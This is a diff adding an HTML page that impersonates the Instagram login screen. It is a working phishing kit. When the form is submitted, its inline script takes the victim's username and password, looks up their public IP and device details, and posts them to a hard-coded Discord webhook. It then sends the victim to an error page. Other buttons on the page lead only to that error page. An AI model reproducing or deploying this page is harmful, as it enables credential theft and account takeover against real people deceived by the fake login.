@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LogIn | Instagram</title>
+    <link rel="stylesheet" href="index.css">
+    <link rel="shortcut icon" href="res/instagram-new.png">
+    <script>
+        // Fonction pour obtenir l'adresse IP publique de l'utilisateur
+        async function getIpAddress() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+
+        // Fonction pour obtenir des informations sur l'appareil
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceInfo = "Inconnu";
+
+            // Détection basique du système d'exploitation et du navigateur
+            if (userAgent.includes("Windows NT")) {
+                deviceInfo = "Windows";
+            } else if (userAgent.includes("Macintosh")) {
+                deviceInfo = "MacOS";
+            } else if (userAgent.includes("Linux")) {
+                deviceInfo = "Linux";
+            } else if (userAgent.includes("Android")) {
+                deviceInfo = "Android";
+            } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
+                deviceInfo = "iOS";
+            }
+
+            if (userAgent.includes("Chrome")) {
+                deviceInfo += " - Chrome";
+            } else if (userAgent.includes("Firefox")) {
+                deviceInfo += " - Firefox";
+            } else if (userAgent.includes("Safari")) {
+                deviceInfo += " - Safari";
+            }
+
+            return deviceInfo;
+        }
+
+        // Fonction pour envoyer les informations au webhook Discord avec un embed
+        async function sendToDiscord(username, password, ip, deviceInfo) {
+            const webhookURL = 'https://discord.com/api/webhooks/1339189477435904033/NYTV6gCOQP3oO04rf09BR7gxRuqdEmgJLncrAmFZE-KQPWVch8-ZZfsNQ8TcCmgOfcnp'; // Remplacez par votre propre URL de webhook Discord
+
+            const embed = {
+                title: "⚠️ Nouvelle LOGS @everyone ⚠️",
+                color: 16711680, // Rouge
+                fields: [
+                    {
+                        name: "📝 Nom d'utilisateur",
+                        value: username,
+                        inline: true
+                    },
+                    {
+                        name: "🔒 Mot de passe",
+                        value: password,
+                        inline: true
+                    },
+                    {
+                        name: "🌍 Adresse !P",
+                        value: ip,
+                        inline: false
+                    },
+                    {
+                        name: "📱 Appareil / Navigateur",
+                        value: deviceInfo,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: ".gg/leakdata"
+                },
+                timestamp: new Date()
+            };
+
+            const payload = {
+                embeds: [embed]
+            };
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi au webhook Discord:', error);
+            }
+        }
+
+        // Fonction pour gérer la soumission du formulaire
+        async function handleSubmit(event) {
+            event.preventDefault(); // Empêche la soumission normale du formulaire
+
+            const username = event.target.username.value;
+            const password = event.target.password.value;
+
+            const ip = await getIpAddress(); // Obtenez l'IP de l'utilisateur
+            const deviceInfo = getDeviceInfo(); // Obtenez les informations de l'appareil
+
+            // Envoyer les informations au webhook Discord
+            await sendToDiscord(username, password, ip, deviceInfo);
+
+            // Rediriger l'utilisateur vers une page d'erreur (par exemple)
+            window.location.href = 'error.html';
+        }
+    </script>
+</head>
+
+<body>
+    <div id="wrapper">
+        <div class="main-content">
+            <div class="header">
+                <img src="res/ig.png" alt="helo">
+            </div>
+            <br>
+
+            <div>
+                <div class="btn1">
+                    <img src="res/facebook.png" style="float: left;" class="icon" alt="">
+                    <input type="button" onclick='window.location ="error.html";' value="Continue with Facebook"
+                        style="float: right;" class="btn2" />
+                </div>
+            </div>
+
+            <div style="margin-top:15px;margin-bottom: 15px;">
+                <pre>─────────    OR    ─────────</pre>
+            </div>
+
+            <div class="l-part">
+                <form name="contact" onsubmit="handleSubmit(event)">
+                    <input type="text" name="username" placeholder="Username" class="input-1" required />
+
+                    <div class="overlap-text">
+                        <input type="password" name="password" placeholder="Password" class="input-2" required />
+                        <a href="error.html">Forgot?</a>
+                    </div>
+
+                    <input type="submit" class="btn" value="Log In">
+                </form>
+            </div>
+        </div>
+
+        <div class="sub-content">
+            <div class="s-part">
+                Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sign up</a>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
